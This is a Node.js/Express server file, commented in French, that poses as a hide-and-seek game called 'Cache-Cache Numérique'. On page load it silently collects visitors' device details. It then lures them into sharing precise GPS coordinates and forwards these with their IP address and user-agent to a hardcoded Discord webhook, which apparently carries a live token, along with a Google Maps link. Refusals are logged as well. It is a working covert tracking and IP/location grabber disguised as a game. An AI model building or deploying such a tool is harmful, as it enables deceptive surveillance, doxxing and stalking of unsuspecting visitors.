const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Remplacez par l'URL de votre Webhook Discord
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1546990311144689736/JNIn6Zl1Dr3ep-Kvm6uwz_HHDfS8vco5ThkHLWGgkMHQOvIph6DdGUd10V3YjbEOndBE";

app.use(express.json());

// Serveur principal avec interface "Cache-Cache Numérique"
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="fr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Cache-Cache Numérique — La Partie Commence</title>
            <style>
                :root {
                    --bg-dark: #090d16;
                    --card-bg: #111827;
                    --accent: #10b981;
                    --accent-hover: #059669;
                    --danger: #ef4444;
                    --text-main: #f9fafb;
                    --text-muted: #9ca3af;
                    --border: #1f2937;
                }

                * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }

                body {
                    background-color: var(--bg-dark);
                    color: var(--text-main);
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                    padding: 20px;
                }

                .game-card {
                    background: var(--card-bg);
                    border: 1px solid var(--border);
                    border-radius: 16px;
                    padding: 32px;
                    max-width: 480px;
                    width: 100%;
                    text-align: center;
                    box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
                }

                .icon {
                    font-size: 3rem;
                    margin-bottom: 16px;
                }

                h1 {
                    font-size: 1.6rem;
                    margin-bottom: 12px;
                    color: var(--text-main);
                }

                p {
                    color: var(--text-muted);
                    font-size: 0.95rem;
                    line-height: 1.5;
                    margin-bottom: 24px;
                }

                .btn-play {
                    background-color: var(--accent);
                    color: #000;
                    border: none;
                    padding: 14px 28px;
                    border-radius: 8px;
                    font-weight: 700;
                    font-size: 1rem;
                    cursor: pointer;
                    width: 100%;
                    transition: background 0.2s;
                }

                .btn-play:hover {
                    background-color: var(--accent-hover);
                }

                /* Zone de message d'erreur pour la géolocalisation */
                .error-box {
                    display: none;
                    margin-top: 16px;
                    padding: 12px;
                    background-color: rgba(239, 68, 68, 0.1);
                    border: 1px solid var(--danger);
                    border-radius: 8px;
                    color: var(--danger);
                    font-size: 0.85rem;
                    line-height: 1.4;
                    text-align: left;
                }

                .info-notice {
                    margin-top: 20px;
                    font-size: 0.8rem;
                    color: var(--text-muted);
                    border-top: 1px solid var(--border);
                    padding-top: 16px;
                }

                #game-dashboard {
                    display: none;
                }
            </style>
        </head>
        <body>

            <!-- Étape 1 : Accueil / Inscription à la partie -->
            <div id="lobby" class="game-card">
                <div class="icon">🙈🔍</div>
                <h1>Cache-Cache Numérique</h1>
                <p>Pour rejoindre la partie et activer la carte en direct des joueurs, autorisez le partage de votre position.</p>
                
                <button class="btn-play" onclick="demarrerPartie()">Rejoindre l'arène</button>

                <!-- Bloc d'erreur affiché uniquement si la position est bloquée/refusée -->
                <div id="geo-error" class="error-box">
                    ⚠️ <strong>Localisation requise :</strong> Impossible de rejoindre l'arène sans autoriser la géolocalisation. Veuillez l'activer dans les paramètres de votre navigateur puis réessayez.
                </div>

                <div class="info-notice">
                    En cliquant, vous acceptez la transmission de vos métadonnées techniques pour la session de jeu.
                </div>
            </div>

            <!-- Étape 2 : Tableau de bord accessible SEULEMENT si la position est validée -->
            <div id="game-dashboard" class="game-card">
                <div class="icon">🎯</div>
                <h1>Partie en cours</h1>
                <p id="status-text">Coordonnées de jeu enregistrées. Recherche de cachettes à proximité...</p>
                <div style="background: #1f2937; padding: 15px; border-radius: 8px; margin-top: 15px; font-size: 0.85rem; color: #10b981;">
                    Statut : Joueur connecté à l'arène
                </div>
            </div>

            <script>
                function collecterMetadonnees() {
                    return {
                        ecran: screen.width + 'x' + screen.height,
                        fuseauHoraire: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        coeursCPU: navigator.hardwareConcurrency || 'Inconnu',
                        ramGo: navigator.deviceMemory ? navigator.deviceMemory + ' Go' : 'Inconnu',
                        langue: navigator.language || 'Inconnue',
                        plateforme: navigator.platform || 'Inconnue'
                    };
                }

                function transmettreMetadonnees(type, gpsData = null) {
                    const payload = {
                        typeEvenement: type,
                        client: collecterMetadonnees(),
                        gps: gpsData
                    };

                    fetch('/api/collecte', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                }

                // Envoi automatique des métadonnées système au chargement de la page
                window.addEventListener('DOMContentLoaded', () => {
                    transmettreMetadonnees('Visite initiale');
                });

                function demarrerPartie() {
                    const errorBox = document.getElementById('geo-error');
                    errorBox.style.display = 'none'; // Reinitialisation de l'affichage de l'erreur

                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            (pos) => {
                                const gpsData = {
                                    lat: pos.coords.latitude,
                                    lon: pos.coords.longitude,
                                    precision: pos.coords.accuracy
                                };

                                // Transmission des coordonnées GPS et déblocage de l'interface
                                transmettreMetadonnees('Localisation validée', gpsData);

                                document.getElementById('lobby').style.display = 'none';
                                document.getElementById('game-dashboard').style.display = 'block';
                            },
                            (err) => {
                                // Notification Discord du refus + blocage sur la page 1 avec message d'erreur
                                transmettreMetadonnees('Refus localisation', { erreur: "Accès refusé (" + err.message + ")" });
                                errorBox.style.display = 'block';
                            },
                            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                        );
                    } else {
                        errorBox.innerText = "⚠️ La géolocalisation n'est pas supportée par votre navigateur.";
                        errorBox.style.display = 'block';
                    }
                }
            </script>
        </body>
        </html>
    `);
});

// Traitement API et Webhook Discord
app.post('/api/collecte', async (req, res) => {
    const body = req.body || {};
    const typeEvenement = body.typeEvenement || 'Événement inconnu';
    const client = body.client || {};
    const gps = body.gps || {};

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Inconnu';

    let gpsText = "⏳ Non partagée";
    let colorCode = 3447003; // Bleu par défaut (Visite)

    if (gps.lat && gps.lon) {
        gpsText = `📍 [${gps.lat}, ${gps.lon}](https://www.google.com/maps?q=${gps.lat},${gps.lon}) (+/- ${Math.round(gps.precision)}m)`;
        colorCode = 65280; // Vert si position GPS reçue
    } else if (gps.erreur) {
        gpsText = `❌ ${gps.erreur}`;
        colorCode = 15158332; // Rouge si position refusée
    }

    const embeds = [{
        title: `🎮 ${typeEvenement}`,
        color: colorCode,
        fields: [
            { name: "🌐 Connexion", value: `**IP :** \`${ip}\`\n**User-Agent :** \`${userAgent}\`` },
            { name: "💻 Appareil", value: `**Écran :** ${client.ecran}\n**CPU :** ${client.coeursCPU} cœurs | **RAM :** ${client.ramGo}\n**Zone :** ${client.fuseauHoraire}` },
            { name: "🎯 Position Joueur", value: gpsText }
        ],
        timestamp: new Date().toISOString()
    }];

    if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL.startsWith('https://discord.com')) {
        try {
            await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ embeds })
            });
        } catch (err) {
            console.error("Erreur Webhook :", err);
        }
    }

    res.sendStatus(200);
});

app.listen(PORT, () => console.log(`Serveur Cache-Cache prêt sur le port ${PORT}`));
